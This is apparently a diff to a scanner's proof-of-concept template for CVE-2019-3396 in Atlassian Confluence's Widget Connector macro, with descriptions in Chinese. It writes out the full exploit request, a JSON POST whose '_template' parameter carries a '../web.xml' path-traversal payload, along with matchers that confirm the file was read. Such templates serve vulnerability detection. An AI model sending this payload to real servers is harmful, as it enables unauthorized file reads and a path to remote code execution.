@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过向 Confluence 的 /rest/tinymce/1/macro/preview 接口发送恶意 JSON 请求，利用 Widget Connector 宏参数 _template 进行目录穿越，读取 web.xml 以验证服务端模板注入漏洞存在（CVE-2019-3396，CVSS 9.8，无需认证即可利用）。"
+description = "通过向Confluence Server的Widget Connector宏REST接口发送特制JSON请求，在_template参数中构造路径穿越载荷，验证服务器端模板注入(SSTI)漏洞是否可被利用以读取任意服务器文件，进而实现远程代码执行。"
 id = "POC-AVE-2019-1200"
-name = "Atlassian Confluence Widget Connector 路径穿越/SSTI PoC"
+name = "Atlassian Confluence Widget Connector Macro SSTI PoC"
 severity = "critical"
 tags = ["ave-2019-1200"]
 vuln_id = [
@@ -19,21 +19,14 @@ path = "/{{BaseURL}}/rest/tinymce/1/macro/preview"
 protocol = "http"
 
 [poc.requests.body]
-content = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}'
+content = '{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}'
 type = "raw"
 
 [poc.requests.headers]
-Content-Type = "application/json; charset=utf-8"
-Referer = "{{Hostname}}"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-status = [200]
-type = "status"
+Content-Type = "application/json"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["<param-name>contextConfigLocation</param-name>"]
+words = ["</web-app>"]
